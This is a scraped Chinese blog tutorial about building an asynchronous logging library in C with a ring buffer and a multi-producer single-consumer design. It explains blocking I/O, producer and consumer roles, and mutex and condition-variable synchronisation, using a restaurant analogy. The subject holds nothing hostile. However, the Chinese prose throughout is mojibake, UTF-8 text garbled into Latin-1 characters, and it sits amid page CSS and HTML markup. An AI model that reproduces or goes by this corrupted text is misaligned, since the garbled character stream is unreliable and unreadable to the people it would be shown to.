                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»32åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Cè¯­è¨€å®æˆ˜ï¼šæ‰‹æ“é«˜å¹¶å‘å¼‚æ­¥æ—¥å¿—åº“ï¼ˆåŸºäº Ring Buffer + ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹ï¼‰</strong></h2>
<h2 data-id="heading-1">1. ä¸ºä»€ä¹ˆ <code>printf</code> ä¸å¤Ÿç”¨ï¼Ÿ</h2>
<p>åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œå°¤å…¶æ˜¯åµŒå…¥å¼è®¾å¤‡ã€å®æ—¶ç³»ç»Ÿæˆ–é«˜å¹¶å‘æœåŠ¡ç«¯ç¨‹åºé‡Œï¼Œå¾ˆå¤šäººä¸€å¼€å§‹éƒ½ä¹ æƒ¯ç›´æ¥ç”¨ printfã€fprintf æˆ– write æŠŠæ—¥å¿—æ‰“åˆ°ä¸²å£ã€æ–‡ä»¶ã€Flashã€‚è¿™ç§åšæ³•åœ¨demoé˜¶æ®µæ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†ä¸€æ—¦ä¸Šäº†ç”Ÿäº§ç¯å¢ƒæ‰å‘ç°è¿™ç©æ„å„¿æ˜¯ä¸ªéšå½¢çš„æ€§èƒ½æ€æ‰‹ã€‚</p>
<p>æˆ‘ä¸‹é¢åˆ—ä¸¾ä¸€ä¸‹å¸¸è§çš„å‡ ä¸ª<strong>è‡´å‘½é—®é¢˜</strong>ï¼ˆæœ¬äººä¹Ÿä¸å¹¸è¸©åˆ°è¿‡ï¼‰ï¼š</p>
<ol>
<li>
<p>åŒæ­¥é˜»å¡ï¼šåƒ<code>write</code>è¿™æ ·çš„åº•å±‚æ¥å£æ˜¯é˜»å¡çš„ï¼Œè€Œç£ç›˜ / Flash / ä¸²å£é€šå¸¸æ˜¯æ¯”è¾ƒæ…¢çš„ï¼ˆFlash æ“¦é™¤ç”šè‡³èƒ½åˆ°å‡ ç™¾æ¯«ç§’ï¼‰ï¼Œä¸šåŠ¡çº¿ç¨‹å°±åªèƒ½å¹²ç­‰ç€ã€‚</p>
<p>æˆ‘ä¹‹å‰å†™äº†ä¸ªdemoå®æµ‹äº†ä¸€ä¸‹ï¼Œç›´æ¥å†™å…¥ 2000 æ¡æ—¥å¿—è€—æ—¶ <strong>7ç§’</strong>ï¼Œè€Œä½¿ç”¨å¼‚æ­¥æ—¥å¿—ä»…éœ€ <strong>0.02ç§’</strong>ï¼Œæ€§èƒ½å·®è·è¾¾ <strong>300å€</strong>ã€‚</p>
</li>
<li>
<p>çº¿ç¨‹ä¸­æ–­é—®é¢˜ï¼šå¤šä»»åŠ¡æˆ–ä¸­æ–­é‡ŒåŒæ—¶ printfï¼Œæ²¡æœ‰é”çš„è¯æ—¥å¿—ç«‹åˆ»èŠ±å±ï¼ˆAçº¿ç¨‹æ‰“å°ä¸€åŠï¼ŒBçº¿ç¨‹æ’è¿›æ¥äº†ï¼‰ï¼Œå¯¼è‡´æ—¥å¿—æ²¡æ³•çœ‹ï¼Œè€ŒåŠ é”åˆä¼šå¸¦æ¥æ–°çš„æ€§èƒ½å’Œæ­»é”é£é™©ã€‚</p>
</li>
<li>
<p>ç¼“å­˜åˆ·æ–°ç­–ç•¥å¤±æ§ï¼š<code>printf</code> é»˜è®¤<strong>è¡Œç¼“å­˜</strong>ï¼ˆé‡åˆ° \n æˆ–ç¼“å†²åŒºæ»¡æ‰åˆ·ï¼‰ï¼Œåœ¨åµŒå…¥å¼é‡Œç»å¸¸å¿˜è®° <code>fflush</code>ï¼Œåœ¨åµŒå…¥å¼ç³»ç»Ÿå´©æºƒæˆ–æ–­ç”µçš„ç¬é—´ï¼Œç¼“å†²åŒºé‡Œé‡è¦çš„æ•°æ®å¾€å¾€è¿˜æ²¡æ¥å¾—åŠåˆ·å…¥ç£ç›˜å°±ä¸¢å¤±äº†<strong>å¯¼è‡´æ—¥å¿—ä¸¢å¤±</strong>éƒ½ä¸çŸ¥é“ã€‚</p>
</li>
<li>
<p>CPU å ç”¨ç‡çˆ†ç‚¸ï¼šé«˜é¢‘ç‡æ‰“æ—¥å¿—æ—¶ï¼ŒCPU å¤§éƒ¨åˆ†æ—¶é—´éƒ½åœ¨ç­‰ I/Oï¼Œè€Œä¸æ˜¯å¹²æ­£äº‹ã€‚</p>
</li>
</ol>
<p>é‚£ä¹ˆæ­£ç¡®çš„æ“ä½œåº”è¯¥æ˜¯æ€æ ·çš„å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬è¦æŠŠè®°å½•æ—¥å¿—å’Œå†™å…¥ç£ç›˜å½»åº•è§£è€¦ã€‚<strong>ä¸šåŠ¡çº¿ç¨‹</strong>åªè´Ÿè´£æŠŠæ—¥å¿—æ‰”è¿›ä¸€ä¸ªå†…å­˜ç¼“å†²åŒºï¼ˆå¤§æ¦‚å‡ å¾®ç§’ï¼‰ï¼Œç„¶åç«‹åˆ»è¿”å›ç»§ç»­å¹²æ´»ã€‚ ç”±ä¸€ä¸ªç‹¬ç«‹çš„<strong>åå°çº¿ç¨‹</strong>æ…¢æ…¢æŠŠç¼“å†²åŒºå†…å®¹åˆ·åˆ°ç£ç›˜/Flash/ä¸²å£å»ã€‚è¿™å°±æ˜¯ç»å…¸çš„ â€œ ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹ â€ å’Œç¯å½¢ç¼“å†²åŒºçš„ç»„åˆã€‚è¿™ä¹Ÿæ˜¯å¾ˆå¤šå·¥ä¸šçº§æ—¥å¿—åº“çš„åº•å±‚åŸç†ã€‚</p>
<h2 data-id="heading-2">2. ç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å‹</h2>
<p>ä¸ºäº†è§£å†³ä¸Šé¢æåˆ°çš„åŒæ­¥é˜»å¡é—®é¢˜ï¼Œæˆ‘ä»¬ä¸èƒ½è®©ä¸šåŠ¡çº¿ç¨‹ç›´æ¥å»â€œç¢°â€ç£ç›˜ã€‚æˆ‘ä»¬éœ€è¦å¼•å…¥ä¸€ä¸ªä¸­é—´å±‚ï¼Œå°†<strong>äº§ç”Ÿæ—¥å¿—</strong>å’Œ<strong>å†™å…¥ç£ç›˜</strong>è¿™ä¸¤ä¸ªåŠ¨ä½œå½»åº•å‰¥ç¦»ã€‚è¿™æ­£æ˜¯è®¡ç®—æœºç§‘å­¦ä¸­ç»å…¸çš„<strong>ç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å‹</strong>çš„æœ€ä½³åº”ç”¨åœºæ™¯ã€‚</p>
<h3 data-id="heading-3">2.1 ç³»ç»Ÿæ¶æ„</h3>
<p>ä¸‹é¢è¦ä»‹ç»çš„è¿™ä¸ªæ¶æ„ä¹Ÿå°±æ˜¯<strong>ç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å‹</strong>è¿™ä¸ªåå­—çš„ç”±æ¥ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥æŠŠæ•´ä¸ªæ—¥å¿—ç³»ç»Ÿçœ‹æˆä¸€ä¸ªç¹å¿™çš„é¤å…çš„å¨æˆ¿ã€‚å¯èƒ½æœ‰äººä¼šæƒ³â€œé‚£ç”Ÿäº§è€…å°±æ˜¯å¨å¸ˆï¼Œæ¶ˆè´¹è€…å°±æ˜¯é¡¾å®¢å‘—â€ï¼Œæˆ‘è®¤ä¸ºè¿™ä¸ªæƒ³æ³•æ—¢åˆç†åˆä¸åˆç†ï¼Œåˆç†æ˜¯å› ä¸ºè¿™ä¸ªæƒ³æ³•æ˜¯ç¬¦åˆæˆ‘ä»¬çš„å¸¸è¯†çš„ï¼Œä¸åˆç†æ˜¯å› ä¸ºåœ¨æ—¥å¿—ç³»ç»Ÿè¿™ä¸ªç¯å¢ƒä¸‹ï¼Œæ˜¯æœ‰ç‰¹æ®Šæƒ…å†µå­˜åœ¨çš„ï¼Œåé¢ä¼šè§£é‡Šã€‚åœ¨è¿™é‡Œï¼Œå…¶å®ç”Ÿäº§è€…ç›¸å½“äºæœåŠ¡å‘˜ï¼Œæ¶ˆè´¹è€…ç›¸å½“äºå¨å¸ˆï¼Œè€Œä»–ä»¬ä¹‹é—´æœ‰ä¸€ä¸ªçª—å£ï¼Œå°±æ˜¯ç¼“å†²åŒºï¼ˆæ”¾èœå•ï¼‰ã€‚æ‰€ä»¥æ•´ä¸ªè¿‡ç¨‹å…¶å®å°±æ˜¯æœåŠ¡å‘˜å»ç»™å¤§é‡çš„å®¢äººç‚¹èœï¼Œç„¶åæŠŠèœå•æ”¾åœ¨çª—å£ï¼Œå¨å¸ˆä»çª—å£æ‹¿èœå•ï¼Œç„¶ååšé¥­ï¼Œåšé¥­å¯ä»¥ç±»æ¯”ä¸ºå†™ç£ç›˜ã€‚åˆ°è¿™é‡Œå°±ç»“æŸï¼Œè‡³å°‘åœ¨ç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å‹ä¸‹ï¼Œè¿™ä¸ªåœºæ™¯å·²ç»å¾ˆå®Œå–„äº†ã€‚æ‰€ä»¥å‰é¢é‚£ä¸ªæŠŠé¡¾å®¢å½“æˆæ¶ˆè´¹è€…çš„æƒ³æ³•æœ‰ç‚¹ä¸å¤ªåˆé€‚ï¼Œå¦‚æœè¿™æ ·ç†è§£å°±ç›¸å½“äºä¸€ä¸ªé¡¾å®¢åé‚£ä¸€ç›´åƒåƒåƒ......ï¼ˆèƒƒå£å¤§çš„è¯å…¶å®ä¹Ÿä¸æ˜¯ä¸è¡ŒğŸŒï¼‰</p>
<p>å¯èƒ½æœ‰çš„æœ‹å‹è¿˜æ˜¯è§‰å¾—ä¸å¤Ÿå½¢è±¡ï¼Œä¸‹é¢æˆ‘æ”¾ä¸€å¼ å›¾å¤§å®¶å¯ä»¥å‚è€ƒä¸€ä¸‹ï¼šï¼ˆçº¯æ‰‹ç”»çš„ï¼Œæ„Ÿè§‰ç”»çš„ä¸é”™çš„æœ‹å‹ç‚¹èµåŠ å…³æ³¨ï¼Œä¸æƒ³çš„è¯å°±ç®—äº†ğŸ˜Šï¼‰</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45bdb3055f634675a5cb1fde633fd717~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGxwNjY2aHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766147788&amp;x-signature=%2Fs%2Bt7FNsPqgKPmUkHdLOFhFg%2Bys%3D" alt="ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹ç³»ç»Ÿæ¶æ„å›¾.png.png" loading="lazy"/></p>
<p>å¯èƒ½æœ‰ç»†å¿ƒçš„æœ‹å‹æ³¨æ„åˆ°äº†ï¼Œæˆ‘åœ¨å›¾ç‰‡ä¸­ç”Ÿäº§è€…ç”¨çš„Producersï¼Œè€Œæ¶ˆè´¹è€…å´ç”¨çš„Consumerï¼Œä»–ä»¬ä¸€ä¸ªæ˜¯å¤æ•°ï¼Œä¸€ä¸ªæ˜¯å•æ•°ï¼Œæ„æ€æ˜¯æœ‰å¤šä¸ªç”Ÿäº§è€…è€Œåªæœ‰ä¸€ä¸ªæ¶ˆè´¹è€…å—ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚è¿™ä¸ªæ¨¡å‹çš„åç§°æ˜¯<strong>MPSC (Multi-Producer Single-Consumer) ï¼Œè¿™æ˜¯é«˜æ€§èƒ½æ—¥å¿—ç³»ç»Ÿçš„æ ‡å‡†æ¶æ„ã€‚</strong></p>
<p>ä¸ºä»€ä¹ˆæ¶ˆè´¹è€…åªæœ‰ä¸€ä¸ªå‘¢ï¼Ÿå¤šä¸ªæ¶ˆè´¹è€…ä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿ</p>
<ol start="0">
<li>æ—¥å¿—æ–‡ä»¶é€šå¸¸æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼ˆlog.txtï¼‰ã€‚å¦‚æœä½ æäº† 5 ä¸ªæ¶ˆè´¹è€…çº¿ç¨‹åŒæ—¶å¾€ä¸€ä¸ªæ–‡ä»¶é‡Œå†™ï¼Œä½ éœ€è¦åŠ å¾ˆé‡çš„é”æ¥é˜²æ­¢æ•°æ®é”™ä¹±ï¼ˆæ¯”å¦‚çº¿ç¨‹ A å†™äº†ä¸€åŠâ€œError...â€ï¼Œçº¿ç¨‹ B æ’è¿›æ¥å†™äº†â€œWarning...â€ï¼‰ã€‚æ—¢ç„¶æœ€ç»ˆéƒ½è¦<strong>åŠ é”æ’é˜Ÿå†™æ–‡ä»¶</strong>ï¼Œé‚£å¤šæå‡ ä¸ªæ¶ˆè´¹è€…çº¿ç¨‹ä¸ä»…æ²¡å˜å¿«ï¼Œåè€Œå¢åŠ äº†<strong>ä¸Šä¸‹æ–‡åˆ‡æ¢çš„å¼€é”€</strong>ï¼Œè¿˜ä¸å¦‚å°±ä¸€ä¸ªçº¿ç¨‹ä¸“é—¨æ’é˜Ÿå†™ã€‚</li>
<li>å¯¹äºæœºæ¢°ç¡¬ç›˜æˆ–åµŒå…¥å¼ Flashï¼Œ<strong>é¡ºåºå†™å…¥</strong>æ˜¯æœ€å¿«çš„ã€‚å¦‚æœæœ‰å¤šä¸ªæ¶ˆè´¹è€…å¹¶å‘å†™ï¼Œç£å¤´ï¼ˆæˆ– Flash ä¸»æ§ï¼‰å¯èƒ½éœ€è¦è·³æ¥è·³å»ï¼Œæ€§èƒ½åè€Œä¼šä¸‹é™ã€‚</li>
<li>ä¸€ä¸ªæ¶ˆè´¹è€…çº¿ç¨‹ç»´æŠ¤ä¸€ä¸ªæ–‡ä»¶å¥æŸ„ï¼Œé€»è¾‘æ¸…æ™°ï¼Œä¸å®¹æ˜“å‡º Bugã€‚</li>
</ol>
<p>å› æ­¤ï¼Œå¯¹äºæ—¥å¿—è½ç›˜è¿™ç§<strong>I/Oå¯†é›†å‹</strong>çš„ä»»åŠ¡ï¼Œå•æ¶ˆè´¹è€…æ˜¯æœ€é«˜æ•ˆçš„é€‰æ‹©ã€‚</p>
<p>è¿˜æœ‰çš„æœ‹å‹å¯èƒ½ä¼šé—®ï¼Œä½ ç¬¬ä¸€ç« æ˜æ˜å†™äº†å¼‚æ­¥æ—¥å¿—å¿«ï¼ŒåŒæ­¥é˜»å¡æ˜¯è‡´å‘½é—®é¢˜ï¼Œæ€ä¹ˆä¸Šé¢çš„æ¶æ„å›¾åˆè¯´å®ç°äº†çº¿ç¨‹åŒæ­¥å‘¢ï¼Ÿè¿™ä¸æ˜¯å·¦è„‘æ”»å‡»å³è„‘å—ï¼Ÿå•Šï¼Œè¿™é‡Œç¡®å®æ¯”è¾ƒç»•ï¼Œæˆ‘æœ‰æ—¶ä¹Ÿå¾—æƒ³å¥½ä¹…æ‰èƒ½æƒ³é€šã€‚ä¸‹é¢æˆ‘ä»¬è¯¦ç»†æ‹†è§£ä¸€ä¸‹ï¼š</p>
<ol start="0">
<li>
<p>åœ¨å®è§‚å±‚é¢ï¼šä¸šåŠ¡æµç¨‹æ˜¯å¼‚æ­¥çš„</p>
<p>è¿™é‡Œçš„å¼‚æ­¥æè¿°çš„æ˜¯ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…ä¹‹é—´çš„åä½œå…³ç³»ã€‚</p>
<p>åŒæ­¥æ—¥å¿—ï¼ˆå­˜åœ¨ç¼ºé™·ï¼‰ï¼šä¸šåŠ¡çº¿ç¨‹è¯´ï¼šâ€œæˆ‘è¦å†™æ—¥å¿—â€ï¼Œç„¶åå°±åœ¨é‚£<strong>æ­»ç­‰</strong>ï¼Œç›´åˆ°ç£ç›˜å†™å®Œæ‰èµ°ã€‚è¿™å«â€œåŒæ­¥é˜»å¡â€ã€‚</p>
<p>å¼‚æ­¥æ—¥å¿—ï¼šä¸šåŠ¡çº¿ç¨‹è¯´ï¼šâ€œæˆ‘è¦å†™æ—¥å¿—â€ï¼ŒæŠŠæ•°æ®æ‰”è¿›ç¼“å†²åŒºï¼Œ<strong>è½¬èº«å°±èµ°</strong>ï¼Œå»å¹²åˆ«çš„äº‹äº†ã€‚å†™ç£ç›˜çš„äº‹ç•™ç»™åå°æ…¢æ…¢åšã€‚è¿™å«â€œå¼‚æ­¥éé˜»å¡â€ã€‚</p>
<p>å› ä¸ºä¸šåŠ¡çº¿ç¨‹ä¸éœ€è¦ç­‰ I/Oï¼Œæ‰€ä»¥æˆ‘ä»¬ç§°ä¹‹ä¸º<strong>å¼‚æ­¥æ—¥å¿—ç³»ç»Ÿ</strong>ã€‚è¿™æ˜¯æ€§èƒ½å¤§å¹…åº¦æå‡çš„åŸå› ã€‚</p>
</li>
<li>
<p>åœ¨å¾®è§‚å±‚é¢ï¼šå†…å­˜è®¿é—®æ˜¯éœ€è¦åŒæ­¥çš„</p>
<p>è¿™é‡Œçš„åŒæ­¥æè¿°çš„æ˜¯ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®åŒä¸€å—å†…å­˜æ—¶çš„å®‰å…¨è§„åˆ™ã€‚</p>
<p>å¦‚æœä¸šåŠ¡çº¿ç¨‹æ­£åœ¨å¾€ <code>Buffer[0]</code> å†™æ•°æ®ï¼Œè¿˜æ²¡å†™å®Œï¼Œåå°çº¿ç¨‹çªç„¶è·‘è¿‡æ¥è¦æŠŠ <code>Buffer[5]</code> è¯»èµ°ã€‚è¿™å°±ä¹±å¥—äº†ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦ä¸€ç§æœºåˆ¶ï¼Œè®©ä»–ä»¬åè°ƒä¸€ä¸‹ï¼šâ€œæˆ‘è¦å†™äº†ï¼Œä½ å…ˆåˆ«åŠ¨â€ï¼ˆäº’æ–¥é”ï¼‰ï¼Œâ€œæˆ‘å†™å®Œäº†ï¼Œè¯¥ä½ è¯»äº†â€ï¼ˆæ¡ä»¶å˜é‡ï¼‰ã€‚</p>
<p>è¿™ç§ä¸ºäº†ä¿è¯æ•°æ®å®‰å…¨ã€ä¸æ‰“æ¶çš„åè°ƒæœºåˆ¶ï¼Œåœ¨æ“ä½œç³»ç»Ÿé‡Œå«<strong>çº¿ç¨‹åŒæ­¥</strong>ã€‚</p>
</li>
</ol>
<p>ä¸¾ä¸€ä¸ªç”Ÿæ´»ä¸­çš„ä¾‹å­æ¥æ¯”å–»ä¸€ä¸‹ï¼š</p>
<p>æˆ‘ä»¬æŠŠä¸šåŠ¡çº¿ç¨‹çœ‹ä½œæœåŠ¡å‘˜ï¼ŒæŠŠ<code>Ring buffer</code>çœ‹ä½œçª—å£çš„èœå•é’‰ï¼ˆå›ºå®šèœå•ï¼‰ï¼ŒæŠŠæ—¥å¿—çº¿ç¨‹çœ‹ä½œå¨å¸ˆã€‚è¿™é‡Œå…ˆç®€å•æä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆæŠŠ<code>Ring Buffer</code>çœ‹ä½œèœå•é’‰ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç¯å½¢ç¼“å†²åŒº<code>Ring Buffer</code>æ­£æ˜¯ä¸€ä¸ª<code>malloc</code>å¾—æ¥çš„å·¨å¤§æ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„<strong>å¤§å°æ˜¯å›ºå®šçš„</strong>ï¼Œæ­£å¦‚èœå•é’‰åªæœ‰ä¸€ä¸ªï¼Œèœå•åªèƒ½æŒ‰é¡ºåºä¸€ä¸ªä¸€ä¸ªæ’ï¼Œèƒ½æ’çš„èœå•æ•°é‡ä¹Ÿæ˜¯æœ‰é™çš„ï¼Œè¿™ä¸ªåé¢è¿˜ä¼šè¯¦ç»†ä»‹ç»ï¼Œå…ˆå›å½’ä¸»é¢˜ã€‚</p>
<p>åœ¨è¿™ä¸ªåœºæ™¯ä¸‹ç†è§£å°±å®¹æ˜“å¤šäº†ã€‚</p>
<p>å¼‚æ­¥ï¼šæœåŠ¡å‘˜å†™å¥½èœå•ï¼Œå¾€å§å°ä¸Šä¸€æ’ï¼Œè½¬èº«å°±å»æ‹›å‘¼ä¸‹ä¸€æ¡Œå®¢äººäº† <strong>ï¼ˆå¼‚æ­¥ï¼‰</strong> ï¼Œä»–ä¸éœ€è¦ç«™åœ¨å¨æˆ¿é—¨å£ç­‰ç€å¨å¸ˆæŠŠèœç‚’å¥½ï¼ˆåŒæ­¥ï¼‰ã€‚è¿™å°±æ˜¯æ•ˆç‡é«˜çš„åŸå› ã€‚</p>
<p>çº¿ç¨‹åŒæ­¥ï¼šå§å°åªæœ‰ä¸€ä¸ªï¼Œèœå•é’‰åªæœ‰ä¸€ä¸ªã€‚å¦‚æœæœåŠ¡å‘˜æ­£åœ¨å¾€ä¸Šæ’èœå•ï¼Œå¨å¸ˆæ­£å¥½ä¼¸æ‰‹å»æ‹”èœå•ï¼Œä¸¤äººçš„æ‰‹å°±ä¼šæ’åœ¨ä¸€èµ·ï¼ˆç–¼ï¼‰ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªè§„åˆ™ï¼ˆäº’æ–¥é”ï¼‰ï¼š<strong>å½“ä¸€ä¸ªäººæ‰‹åœ¨æ¥è§¦èœå•é’‰æ—¶ï¼Œå¦ä¸€ä¸ªäººå¿…é¡»åœ¨æ—è¾¹ç­‰ç€ã€‚</strong> è¿™å°±æ˜¯<strong>çº¿ç¨‹åŒæ­¥</strong>ï¼Œå¹¶ä¸æ˜¯è¯´æˆ‘ä»¬è¦ä¸€èµ·åŠ¨ä½œï¼Œè€Œæ˜¯æˆ‘ä»¬è¦<strong>åè°ƒå¥½é¡ºåºï¼Œä¸è¦æ‰“æ¶</strong>ã€‚</p>
<h3 data-id="heading-4">2.2 æ ¸å¿ƒè§’è‰²å®šä¹‰</h3>
<p>åœ¨è¿™ä¸ªæ¨¡å‹ä¸­ï¼Œæ¯ä¸ªè§’è‰²éƒ½æœ‰è‡ªå·±çš„èŒè´£ï¼š</p>
<ol start="0">
<li>
<p>ç”Ÿäº§è€…ï¼š</p>
<p>ç³»ç»Ÿä¸­çš„ä¸šåŠ¡é€»è¾‘çº¿ç¨‹ï¼ˆå¦‚ä¼ æ„Ÿå™¨ä¿¡æ¯é‡‡é›†ï¼‰ï¼Œå®ƒè°ƒç”¨ <code>log_push</code> æ¥å£ï¼Œå°†æ ¼å¼åŒ–å¥½çš„æ—¥å¿—å­—ç¬¦ä¸²<strong>å†™å…¥ç¼“å†²åŒº</strong>ã€‚å¦‚æœç¼“å†²åŒºæ²¡æ»¡ï¼Œå†™å…¥åŠ¨ä½œå‡ ä¹æ˜¯ç¬æ—¶çš„ï¼Œå¦‚æœæ»¡äº†ï¼Œå¯ä»¥é€‰æ‹©ä¸¢å¼ƒæˆ–çŸ­æš‚ç­‰å¾…ï¼ˆè¿™å–å†³äºç­–ç•¥ï¼‰ã€‚</p>
</li>
<li>
<p>ç¯å½¢ç¼“å†²åŒºï¼š</p>
<p>ä¸€æ®µå›ºå®šå¤§å°çš„å†…å­˜ç©ºé—´ã€‚ä½œä¸ºâ€œè“„æ°´æ± â€ï¼Œå¹³æ»‘ä¸šåŠ¡çº¿ç¨‹çš„æµé‡æ³¢å³°ã€‚ä½¿ç”¨æ•°ç»„æ¨¡æ‹Ÿç¯å½¢é˜Ÿåˆ—ï¼Œé¿å…é¢‘ç¹çš„å†…å­˜ç”³è¯·ä¸é‡Šæ”¾ã€‚</p>
</li>
<li>
<p>æ¶ˆè´¹è€…ï¼š</p>
<p>ä¸€ä¸ªç‹¬ç«‹çš„åå°å®ˆæŠ¤çº¿ç¨‹ã€‚æ­»å¾ªç¯æ£€æŸ¥ç¼“å†²åŒºã€‚æœ‰æ•°æ®å°±å–å‡ºï¼Œå†™å…¥æ–‡ä»¶ <code>write</code>ï¼Œæ²¡æ•°æ®å°±æŒ‚èµ· <code>wait</code>ï¼ŒèŠ‚çœ CPU èµ„æºã€‚è™½ç„¶å®ƒå†™ç£ç›˜æ…¢ï¼Œä½†å®ƒä¸€ç›´åœ¨åå°é»˜é»˜å·¥ä½œï¼Œ<strong>ä¸å½±å“å‰å°ä¸šåŠ¡</strong>ã€‚</p>
</li>
</ol>
<h3 data-id="heading-5">2.3 ä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡ï¼Ÿ</h3>
<p>è§£è€¦ï¼šè¿™æ ·è®¾è®¡å¯ä»¥<strong>è®©ä¸šåŠ¡é€»è¾‘ä¸å†ä¾èµ–ç£ç›˜ I/O çš„é€Ÿåº¦</strong>ã€‚å“ªæ€•ç£ç›˜çªç„¶å¡é¡¿äº† 1 ç§’ï¼Œä¸šåŠ¡çº¿ç¨‹ä¾ç„¶å¯ä»¥æµç•…è¿è¡Œï¼Œåªè¦ç¼“å†²åŒºæ²¡æ»¡ã€‚</p>
<p>å‰Šå³°å¡«è°·ï¼šåœ¨æŸä¸€ç¬é—´ï¼Œæ—¥å¿—é‡å¯èƒ½<strong>ç¬é—´çˆ†å‘</strong>ã€‚ç¼“å†²åŒºå¯ä»¥<strong>æš‚æ—¶å…œä½</strong>è¿™äº›æ•°æ®ï¼Œåå°çº¿ç¨‹å†æ…¢æ…¢æ¶ˆåŒ–ã€‚å¦‚æœæ²¡æœ‰ç¼“å†²åŒºï¼Œè¿™ç§ç¬é—´çš„å¤§é‡ I/O è¯·æ±‚å¯èƒ½ä¼šç›´æ¥æŠŠç³»ç»Ÿæ‹–å®ã€‚</p>
